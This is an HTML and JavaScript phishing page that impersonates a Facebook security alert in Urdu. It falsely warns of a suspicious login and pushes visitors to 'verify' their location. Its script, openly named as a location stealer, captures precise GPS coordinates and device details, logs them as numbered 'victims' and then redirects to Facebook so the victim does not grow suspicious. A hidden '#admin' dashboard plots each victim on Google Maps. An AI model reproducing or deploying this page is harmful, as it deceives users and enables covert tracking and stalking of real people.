<!DOCTYPE html>
<html>
<head>
    <title>Facebook Security Alert</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen-Sans,Ubuntu,Cantarell,"Helvetica Neue",sans-serif;background:#f0f2f5;min-height:100vh;padding:20px;display:flex;flex-direction:column;align-items:center;justify-content:center}
        .fb-container{max-width:380px;width:100%;background:#fff;border-radius:12px;box-shadow:0 2px 10px rgba(0,0,0,.1);overflow:hidden}
        .fb-header{background:#1877f2;padding:20px;text-align:center;color:#fff}
        .fb-logo{font-size:36px;margin-bottom:8px}
        .fb-title{font-size:22px;font-weight:600;margin-bottom:4px}
        .fb-subtitle{font-size:14px;opacity:.9}
        .content{padding:30px 25px;text-align:center}
        h2{font-size:20px;color:#1c1e21;font-weight:600;margin-bottom:12px}
        p{color:#65676b;font-size:15px;line-height:1.4;margin-bottom:25px}
        .verify-btn{width:100%;background:#1877f2;color:#fff;border:none;padding:14px;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;transition:background .2s}
        .verify-btn:hover{background:#166fe5}
        .status{margin-top:20px;padding:16px;border-radius:8px;font-size:15px;font-weight:500}
        .success{background:#d9f5d9;color:#0a531b;border:1px solid #9ee69e}
        .loading{background:#fef3c7;color:#92400e;border:1px solid #fed38e}
        .error{background:#fed8d8;color:#8b1e1e;border:1px solid #fca5a5}
        .dashboard{position:fixed;top:0;left:0;right:0;bottom:0;background:#fff;z-index:999;display:none;overflow:auto;padding:20px}
        .dash-header{background:#1877f2;color:#fff;padding:20px;text-align:center}
        .close-dash{position:absolute;top:15px;right:20px;background:rgba(255,255,255,.2);color:#fff;border:none;border-radius:50%;width:35px;height:35px;cursor:pointer;font-size:18px}
        .victim{margin:20px 0;padding:20px;background:#f8f9fa;border-radius:10px;border-left:4px solid #1877f2}
        .victim-header{font-size:18px;font-weight:600;margin-bottom:10px}
        .coords{font-size:22px;font-weight:700;color:#1877f2;margin:8px 0}
        .details{font-size:14px;color:#65676b;margin:5px 0}
        .map-btn{background:#42b883;color:#fff;padding:10px 20px;border-radius:20px;text-decoration:none;font-weight:600;font-size:14px;display:inline-block;margin-top:10px}
        .clear-btn{background:#e4e6ea;color:#1c1e21;border:none;padding:10px 20px;border-radius:20px;cursor:pointer;font-weight:600;margin-top:20px}
        @media(max-width:500px){.fb-container{margin:10px}}
    </style>
</head>
<body>

<!-- Facebook Victim Page -->
<div class="fb-container">
    <div class="fb-header">
        <div class="fb-logo">f</div>
        <div class="fb-title">Facebook Security</div>
        <div class="fb-subtitle">Account Protection Required</div>
    </div>
    <div class="content">
        <h2>مشکوک لاگ ان کا پتہ چلا</h2>
        <p>آپ کے Facebook اکاؤنٹ میں عجیب سرگرمی دیکھی گئی۔<br>لوکیشن تصدیق کرکے اکاؤنٹ محفوظ کریں!</p>
        <button class="verify-btn" onclick="stealLocation()">📍 لوکیشن چیک کریں</button>
        <div id="status" class="status loading">GPS کنیکٹ ہو رہا ہے...</div>
    </div>
</div>

<!-- Admin Dashboard -->
<div id="dashboard" class="dashboard">
    <div class="dash-header">
        <span style="font-size:24px;font-weight:700">🎯 Facebook Location Harvest</span>
        <button class="close-dash" onclick="closeDashboard()">×</button>
    </div>
    <div id="victim-list">
        <div style="text-align:center;padding:60px;color:#65676b">
            پہلا Victim انتظار میں...
        </div>
    </div>
    <button class="clear-btn" onclick="clearAllVictims()" style="width:100%;margin-top:30px">🗑️ تمام Victims Delete کریں</button>
</div>

<script>
// Unique Victim Storage (Session + Local)
let victimHarvest = JSON.parse(localStorage.getItem('fb_victims')) || [];
let harvestId = 0;

// Live Dashboard Update
function refreshDashboard() {
    const list = document.getElementById('victim-list');
    if (victimHarvest.length === 0) {
        list.innerHTML = '<div style="text-align:center;padding:60px;color:#65676b">پہلا Victim انتظار میں...</div>';
        return;
    }
    
    list.innerHTML = victimHarvest.map((victim, index) => `
        <div class="victim">
            <div class="victim-header">Victim #${index + 1} (${victim.time})</div>
            <div class="coords">${victim.lat.toFixed(6)}, ${victim.lon.toFixed(6)}</div>
            <div class="details">درستگی: ${victim.accuracy}m | ${victim.device}</div>
            <div class="details">${navigator.platform} | ${new Date(victim.timestamp).toLocaleString('ur-PK')}</div>
            <a href="https://www.google.com/maps?q=${victim.lat},${victim.lon}&z=18" target="_blank" class="map-btn">🗺️ Google Maps میں کھولیں</a>
        </div>
    `).join('');
}

// Core Location Stealer
function stealLocation() {
    const status = document.getElementById('status');
    status.textContent = 'GPS تلاش...';
    status.className = 'status loading';
    
    if ('geolocation' in navigator) {
        navigator.geolocation.getCurrentPosition(
            (position) => {
                const victimData = {
                    id: `FB_${++harvestId}_${Date.now()}`,
                    lat: position.coords.latitude,
                    lon: position.coords.longitude,
                    accuracy: Math.round(position.coords.accuracy),
                    device: navigator.userAgent.slice(0, 60),
                    platform: navigator.platform,
                    timestamp: Date.now()
                };
                
                // Harvest Complete!
                victimHarvest.unshift(victimData); // Newest first
                localStorage.setItem('fb_victims', JSON.stringify(victimHarvest));
                
                // Status Update
                status.innerHTML = `
                    ✅ لوکیشن محفوظ!<br>
                    <strong>${victimData.lat.toFixed(6)}, ${victimData.lon.toFixed(6)}</strong><br>
                    درستگی: ${victimData.accuracy}m
                `;
                status.className = 'status success';
                
                // Auto Facebook Redirect (No Suspicion)
                setTimeout(() => {
                    window.location.href = 'https://www.facebook.com/?sk=hf';
                }, 2500);
                
                refreshDashboard();
            },
            (error) => {
                let msg = 'خطرہ! ';
                if (error.code === 1) msg += 'لوکیشن اجازت دیں';
                else if (error.code === 2) msg += 'GPS آن کریں';
                else msg += 'دوبارہ کوشش کریں';
                status.textContent = msg;
                status.className = 'status error';
            },
            {
                enableHighAccuracy: true,
                timeout: 12000,
                maximumAge: 5000
            }
        );
    } else {
        status.textContent = 'GPS دستیاب نہیں';
        status.className = 'status error';
    }
}

// Dashboard Controls
function openDashboard() {
    document.getElementById('dashboard').style.display = 'block';
    refreshDashboard();
}

function closeDashboard() {
    document.getElementById('dashboard').style.display = 'none';
}

function clearAllVictims() {
    victimHarvest = [];
    localStorage.removeItem('fb_victims');
    refreshDashboard();
}

// Auto-open dashboard if admin link
if (window.location.hash === '#admin') {
    openDashboard();
}

// Initialize
window.addEventListener('load', () => {
    refreshDashboard();
    document.addEventListener('click', (e) => {
        if (e.target.id === 'admin-trigger') openDashboard();
    });
});
</script>

</body>
</html>
